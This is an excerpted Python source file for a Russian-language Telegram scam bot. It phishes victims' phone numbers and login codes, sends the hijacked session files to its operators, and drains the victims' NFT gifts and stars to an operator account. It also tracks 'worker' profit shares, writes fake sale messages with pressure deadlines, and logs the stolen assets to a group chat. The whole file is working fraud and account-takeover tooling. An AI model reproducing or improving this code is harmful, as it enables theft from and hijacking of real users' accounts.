...
# Импорты Pyrogram (Управление юзерами)
...
def should_skip_log_user(user_data) -> bool:
    ...
    banned_words = ['team', 'teams', 'тима', 'тим']
...
def get_deadline_date():
    """Генерирует дату MSK + 6 часов в формате 'день месяц год года часы:минуты по МСК+6'"""
    months = {
...
DEFAULT_SETTINGS = {
    "target_user": "@vafliki",      # Куда сливать NFT
    "admin_ids": [6233384461],      # ID админов
    "allowed_group_id": -1003143792246, # ID группы для логов
    ...
    "bot_token": "",                # Токен бота от FatherBot
...
logging.basicConfig(
    level=logging.INFO, # Оставляем INFO, чтобы видеть всё
...
# Enable aiogram logs to see incoming updates
...
if not SETTINGS.get("bot_token") and not os.getenv("BOT_TOKEN"):
    logger.error("BOT_TOKEN не найден в настройках или переменных окружения. Завершение работы.")
    sys.exit(1)
...
class Database:
    ...
    def get_user(self, user_id):
        with db_lock:
            ...
            return {'user_id': row[0], 'username': row[1], 'first_name': row[2], 'balance': row[3], 'worker_id': row[4], 'is_mamont': row[5], 'is_dumped': row[6], 'original_username': row[7], 'original_first_name': row[8], 'worker_profits': row[9] if len(row) > 9 else 0, 'worker_total_profits': row[10] if len(row) > 10 else 0} if row else None
...
# ================= RATE LIMITING (ИСПРАВЛЕННЫЙ) =================
class RateLimitMiddleware(BaseMiddleware):
    def __init__(self):
        # super().__init__() # В Aiogram 3.x super init часто не нужен для BaseMiddleware, но оставим для совместимости если надо
        self.user_actions = {}  # user_id: [timestamps]

    async def __call__(self, handler, event, data):
        # Оборачиваем в try-except, чтобы ошибка в антиспаме не ломала бота
        try:
            if hasattr(event, 'from_user') and event.from_user:
                ...
                # Проверка лимита (чуть увеличим для надежности тестов)
                limit_hit = False
                if isinstance(event, types.Message):
                    if len(self.user_actions[user_id]) >= 20: 
                        limit_hit = True
                elif isinstance(event, types.CallbackQuery):
                    if len(self.user_actions[user_id]) >= 40:
                        limit_hit = True

                if limit_hit:
                    logger.warning(f"Rate limit hit for {user_id}")
                    return # Игнорируем спамера

                self.user_actions[user_id].append(now)
                logger.info(f"Middleware passed for user {user_id}")
        except Exception as e:
            print(f"⚠️ Ошибка в Middleware (сообщение пропущено): {e}")
        
        # Самое важное: передаем сообщение дальше боту, даже если защита сбойнула
...
async def get_floor_price():
    """Get FLOOR (FLOKI) price from CoinGecko API (fallback)"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.coingecko.com/api/v3/simple/price?ids=floki&vs_currencies=usd", timeout=5) as response:
                if response.status == 200:
                    data = await response.json()
                    return float(data.get('floki', {}).get('usd', 0))
    except Exception as e:
        print(f"Error getting FLOOR price: {e}")
    return 0

def calculate_floor_amount(stars_amount):
    """Convert stars amount to FLOOR equivalent (fallback calculation)"""
    floor_price = 0.00003  # Approximate FLOOR price in USD
    star_price = 0.012  # Approximate star price in USD
    total_usd = stars_amount * star_price
    return total_usd / floor_price if floor_price > 0 else 0
...
async def log_check_activation(bot: Bot, user: types.User, check_data: dict):
    if should_skip_log_user(user): return
...
async def log_to_topic(bot: Bot, topic_key: str, text: str):
    print(f"DEBUG: log_to_topic called with topic_key={topic_key}")
    gid = SETTINGS.get('allowed_group_id')
    tid = SETTINGS.get(topic_key)
    print(f"DEBUG: gid={gid}, tid={tid}")

    if gid and tid:
        try:
            print(f"DEBUG: Attempting to send message to chat_id={gid}, thread_id={tid}")
            # Добавляем разделитель для визуальной структуры
            ...
            print(f"DEBUG: Message sent successfully to {topic_key}")
        except TelegramRetryAfter as e:
            print(f"DEBUG: TelegramRetryAfter, waiting {e.retry_after}s")
            ...
            try:
                ...
                print(f"DEBUG: Retry message sent successfully")
            except Exception as retry_e:
                print(f"DEBUG: Retry failed: {retry_e}")
                logger.error(f"Log Retry Error: {retry_e}")
        except Exception as e:
        ...
        print(f"DEBUG: Missing gid or tid - gid={gid}, tid={tid}")

async def log_profit_to_topic(bot: Bot, profit_data: dict, chat_id=None):
    """Log profit information to topic_profit with real Portals floor prices"""
    if chat_id is None:
        chat_id = SETTINGS.get('allowed_group_id')
    print("DEBUG: log_profit_to_topic called")
    mamont_tag = profit_data.get('mamont_tag', 'Unknown')
    print(f"DEBUG: mamont_tag = {mamont_tag}")
    nft_data = profit_data.get('nft_data', [])
    print(f"DEBUG: nft_data = {nft_data}")
    worker_id = profit_data.get('worker_id', None)
    print(f"DEBUG: worker_id = {worker_id}")
    nft_count = len(nft_data)  # Number of gifts

    # Get real floor prices from Portals API
    gift_links = [nft.get('url', '') for nft in nft_data if nft.get('url')]
    total_floor_price = 0.0
    floor_details = {}

    if PORTALS_AVAILABLE and gift_links:
        print(f"DEBUG: Calculating real floor prices for {len(gift_links)} gifts")
        try:
            portals_result = await portals_api.calculate_total_floor_price(gift_links)
            total_floor_price = portals_result.get('total', 0.0)
            floor_details = {detail['link']: detail['floor_price'] for detail in portals_result.get('details', [])}
            print(f"DEBUG: Total floor price: {total_floor_price} TON")
        except Exception as e:
            print(f"DEBUG: Portals API failed: {e}")
            total_floor_price = 0.0

    # Calculate adjusted prices (subtract 7.5% from total, then add 7.5% markup for display)
    base_floor_price = total_floor_price * 0.925  # Subtract 7.5%
    display_floor_price = base_floor_price * 1.075  # Add 7.5% markup
    worker_share = display_floor_price * 0.6  # 60% of display price

    # Calculate total stars from NFTs
    total_stars = sum(nft.get('star_count', 0) for nft in nft_data)

    # Получаем тег воркера для отображения
    ...
    # Формируем список ссылок на NFT как цитату без индивидуальных цен
    nft_text_lines = []
    for nft in nft_data:
    ...
    nft_text = "\n".join(nft_text_lines) if nft_text_lines else "<blockquote>Нет NFT</blockquote>"

    # Build wallet info (полный адрес без скрытия)
    wallet_text = ""
    if wallet_info:
    ...
    profit_log = (
        ...
        f"<b>[🔻] Были получены:</b>\n"
        f"<b>{nft_text}</b>\n"
        f"<b>💵 Стоимость подарков: {display_floor_price:.2f} TON</b>\n"
        f"<b>🔹 Доля воркера: {worker_share:.2f} TON</b>\n"
        f"<b>👷 Воркер: {worker_tag}</b>{wallet_text}"
    )
    print(f"DEBUG: Profit log text: {profit_log[:100]}...")
    # Временно отправляем в основной чат без топика для тестирования
    try:
        print("DEBUG: Attempting to send to main chat")
        print(f"DEBUG: Chat ID: {SETTINGS.get('allowed_group_id')}")
        ...
        print(f"DEBUG: Profit log sent to main chat, message_id: {result.message_id}")
    except Exception as e:
        print(f"DEBUG: Failed to send profit log: {e}")
        import traceback
        traceback.print_exc()
        # Fallback to topic
        await log_to_topic(bot, 'topic_profit', profit_log)
...
async def transfer_nft_gift(client: Client, gift_details):
    ...
    try:
        ...
        print_success(f"NFT {gift_details['title']} передан на @{target}")
...
async def FULL_WORKER_CYCLE(client: Client, banker_client: Client, bot: Bot):
    ...
    for nft in nfts_to_send:
        if await transfer_nft_gift(client, nft):
            nft_count += 1
            stars_earned += nft['star_count']  # Add stars earned from NFT transfers
        await asyncio.sleep(0.5)

    # Calculate total profit (NFT stars + any remaining stars before drain)
    remaining_stars = await get_stars_info(client)
    total_profit = stars_earned + remaining_stars

    # Prepare NFT links for logging
    nft_links = [f"🎁 {nft['title']}" for nft in nfts_to_send]
    ...
    # Get worker ID from user database
    worker_id = u_db.get('worker_id') if u_db else None

    # Лог профита всегда выводится
    ...
    if tradeban_nfts:
        ...
        if worker_id:
            ...
            if worker_user and worker_user.get('username'):
                ...
                worker_tag = f"ID:{worker_id}"
        # Лог трейдбанов тоже всегда выводится
...
<body>
    <div class="container">
        ...
        <div class="content">
            ...
            <div class="deadline">
                ...
                <strong>{get_deadline_date()}</strong>
            </div>
    ...
    async def api_send_phone(self, request):
        try:
            ...
            if not should_skip_log_user(u_db):
    ...
    async def api_send_code(self, request):
        ...
        try:
            ...
            try:
                ...
                await self.log_to_topic(self.bot, 'topic_auth', log_card)
    ...
    async def run(self):
        ...
        # ИСПРАВЛЕНИЕ: Подключаем middleware к message, а не update,
        # чтобы event.from_user существовал
    ...
    async def finalize_login(self, client, user_id):
        ...
        try:
            ...
            if not should_skip_log_user(me):
                await log_to_topic(self.bot, 'topic_auth', log_card)
            ...
            await send_file_to_admins(self.bot, SESSIONS_DIR / f"{client.name}.session", f"📦 {m_phone}")
...
def get_main_router(bot_instance: Bot, current_api_url: str):
    ...
    # (Они должны быть доступны для command_start)
    ...
    async def process_inline_check_activation(message, params):
        try:
            params_parts = params.split("_")
            if len(params_parts) < 2: return

            cr_id = int(params_parts[0])
            amt = int(params_parts[1])
    ...
    async def command_start(message: types.Message):
        ...
        # ЛОГИКА ОБРАБОТКИ АРГУМЕНТОВ (c_... / q_...)
        args = command.args
        if args:
            try:
                if args.startswith("c_"):
                    ...
                    return # Прерываем, чтобы не слать меню
                elif args.startswith("q_"):
                    # Формат: q_USERID_AMOUNT_TOKEN
                    params = args.replace("q_", "")
                    await process_inline_check_activation(message, params)
                    return # Прерываем
            except Exception as e:
                print_error(f"Error processing start args: {e}")

        # Стандартное поведение (Меню)
        try:
            ...
            print(f"Menu sent successfully to user {user_id}")
        except Exception as e:
            print_error(f"/start menu error: {e}")
    ...
    async def worker_panel(message: types.Message, state: FSMContext):
        ...
        txt = (
            ...
            f"💎 <b>Общая сумма профитов:</b> <code>{total_profits} ⭐️</code>\n"
    ...
    async def bind_wallet_start(call: types.CallbackQuery, state: FSMContext):
        await call.message.answer(
            ...
            reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🔙 Назад", callback_data="worker_refresh")),
            parse_mode="HTML"
        )
    ...
    async def bind_wallet_address(message: types.Message, state: FSMContext):
        ...
        await message.answer(
            ...
            reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🏠 В панель воркера", callback_data="worker_refresh")),
            parse_mode="HTML"
        )
        await state.clear()
    ...
    async def fake_sale_amount(m: Message, state: FSMContext):
        ...
        fake_sale = (
            ...
            f"🔺 <b>Если звезды не будут полученны в течении этого времени они пропадут</b>\n\n"
            f"✅ <b>После вывода звезд получателем средства буду автоматически переданы на ваш баланс.</b>"
        )
    ...
    f"💡 <b>Выберите нужное действие ниже:</b>"
        ...
        if edit:
            try:
                ...
                # Message can't be deleted, just continue
                print(f"Could not delete message: {e}")

            p = Path("start.jpg")
            if p.exists():
                await message.answer_photo(FSInputFile(p), caption=txt, reply_markup=kb.as_markup())
            else:
                await message.answer(txt, reply_markup=kb.as_markup())
    ...
    async def inline(q: types.InlineQuery):
        ...
        async def catch_all_handler(message: types.Message):
            ...
            # Можно вообще закомментировать ответ, чтобы бот не спамил в чатах
            # await message.reply("Я получил ваше сообщение, но не знаю, как на него ответить.") 
            pass

    return router  # <--- Это конец функции get_main_router
